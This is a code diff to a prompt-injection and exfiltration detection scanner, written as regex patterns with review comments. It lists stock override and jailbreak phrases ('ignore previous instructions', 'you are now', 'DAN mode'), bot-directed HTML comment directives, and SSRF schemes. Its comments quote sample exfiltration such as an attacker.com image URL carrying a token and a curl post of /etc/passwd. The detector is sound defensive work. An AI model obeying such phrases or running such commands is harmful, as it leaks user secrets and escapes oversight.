@@ -81,7 +81,15 @@ const INJECTION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   { name: "system_tag", pattern: /<\/?system>|<\/?admin>|\[system\]|\[admin\]/i },
   { name: "ignore_instructions", pattern: /ignore\s+(?:all\s+)?(?:previous|prior|above|your)\s+(?:instructions|rules|prompts?)/i },
   { name: "new_instructions", pattern: /new\s+instructions?\s*:/i },
-  { name: "role_override", pattern: /you\s+are\s+now|from\s+now\s+on|act\s+as\s+(?:a|an)\s/i },
+  // "act as a/an X" only counts as a role-override attempt when X is an authority/
+  // system-impersonation noun — bare "we act as an intermediary"-style business
+  // language uses the same phrase with an ordinary noun and must not be flagged
+  // (see false-positive test). Adversarial review found "developer"/"moderator"/
+  // "system" too generic — they match ordinary phrases like "act as a developer
+  // advocate" or "act as a moderator for the panel" — so those three were
+  // dropped from the allowlist; the remaining nouns essentially never appear in
+  // benign business/technical text.
+  { name: "role_override", pattern: /you\s+are\s+now|from\s+now\s+on|act\s+as\s+(?:a|an)\s+(?:admin|administrator|root|superuser|sudo|unrestricted|jailbroken|dan)\b/i },
   { name: "hidden_instruction", pattern: /HIDDEN_PROMPT|HIDDEN_INSTRUCTION|INVISIBLE_TEXT/i },
   { name: "jailbreak", pattern: /jailbreak|DAN\s*mode|developer\s+mode|unrestricted\s+mode/i },
   { name: "bypass_safety", pattern: /bypass\s+(?:security|safety|filters|restrictions|guardrails)/i },
@@ -100,6 +108,15 @@ const INJECTION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   { name: "path_traversal_hex", pattern: /(?:2e2e2f){2,}|(?:2e2e5c){2,}/i },
   { name: "office_xml_script", pattern: /<(?:office|o):\w+[^>]*>[\s\S]*?<script/i },
   { name: "rtf_ole_object", pattern: /\\object\\obj(?:emb|link|auto)|\\objdata\s/i },
+  // A bounded filler-word tolerance (please/now/you should/etc. before the
+  // verb) was tried here to catch payloads like "AGENT: please execute the
+  // payload" — reverted after adversarial review found it reopens the exact
+  // v4.25.0 false-positive class it was built to avoid: the filler words
+  // combine with ordinary verbs from the allowlist to match completely benign
+  // comments ("AI: please send feedback to the team", "BOT: you should run
+  // the tests before pushing"). Exact adjacency stays as the only reliable
+  // (if narrower) signal; see tests/adversarial/RESULTS-v4.25.0.md for the
+  // prior FPR history this pattern's verb requirement was added to fix.
   { name: "html_comment_directive", pattern: /<!--\s*(?:BOT|AGENT|ASSISTANT|AI|LLM)\s*:\s*(?:execute|run|call|invoke|perform|fetch|send|ignore|bypass|forget|override|disregard|print|reveal|output|delete|drop)\b/i },
   { name: "embedded_tool_call", pattern: /<tool[_-]?call[^>]*>|<\/tool[_-]?call>/i },
   { name: "langchain_gadget", pattern: /\{["']lc["']\s*:\s*[12]\s*,\s*["']type["']\s*:\s*["'](?:constructor|secret|not_implemented)/i },
@@ -120,7 +137,13 @@ const SECRET_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
 ];
 
 const EXFILTRATION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
-  // Named-key exfil: markdown image URL whose query param key hints at data smuggling
+  // Named-key exfil: markdown image URL whose query param key hints at data
+  // smuggling. Removing "token" from this list was tried (it's a common key
+  // name for legitimate signed-CDN URLs) but reverted after adversarial
+  // review showed it silently reopens a real exfil bypass
+  // (![img](https://attacker.com/log?token=...) went undetected) — for a
+  // security-relevant pattern, restoring recall takes priority over the
+  // narrower, lower-severity CDN false positive.
   { name: "markdown_image_exfil", pattern: /!\[.*?\]\(https?:\/\/[^)]*\?[^)]*(?:token|key|secret|data|q|payload|p|prompt|ctx|context|info|msg|body|session|conv)=/i },
   // "Reprompt"-style exfil (CVE-2026-24307): markdown image with any long query-param value (≥30 chars).
   { name: "markdown_image_exfil_long_value", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)&]{30,}/ },
@@ -129,6 +152,13 @@ const EXFILTRATION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   { name: "tracking_pixel", pattern: /<img[^>]+src=["']https?:\/\/[^"']*\?[^"']*["'][^>]*(?:width|height)\s*=\s*["']?[01]px/i },
   { name: "encoded_url_exfil", pattern: /https?:\/\/[^\s]*(?:callback|webhook|exfil|collect)[^\s]*\?[^\s]*(?:data|payload|d)=/i },
   { name: "data_send_instruction", pattern: /send\s+(?:this|the|all)\s+(?:data|information|content|context)\s+to/i },
+  // Narrowing this to require an exfil-shaped query param was tried (fetching
+  // an arbitrary URL, e.g. "fetch https://api.example.com/pricing", is
+  // mundane on its own) but reverted after adversarial review found it
+  // misses real exfil that doesn't put its payload in a query string: body-
+  // based exfil ("curl -X POST ... --data-binary @/etc/passwd"), and bare
+  // C2/beacon URLs with no query string at all. Recall matters more here
+  // than the narrower false positive.
   { name: "fetch_url", pattern: /(?:fetch|request|call|curl|wget)\s+https?:\/\//i },
 ];
 
@@ -143,7 +173,7 @@ const SSRF_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   // Gopher protocol — Redis/memcache SSRF smuggling
   { name: "gopher_scheme", pattern: /gopher:\/\//i },
   // Other dangerous non-HTTP schemes
-  { name: "dangerous_scheme", pattern: /(?:dict|ldap|ldaps|sftp|tftp|jar|netdoc):\/\//i },
+  { name: "dangerous_scheme", pattern: /(?:dict|ldap|ldaps|sftp|tftp|jar|netdoc|ftp):\/\//i },
 ];
 
 const PII_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
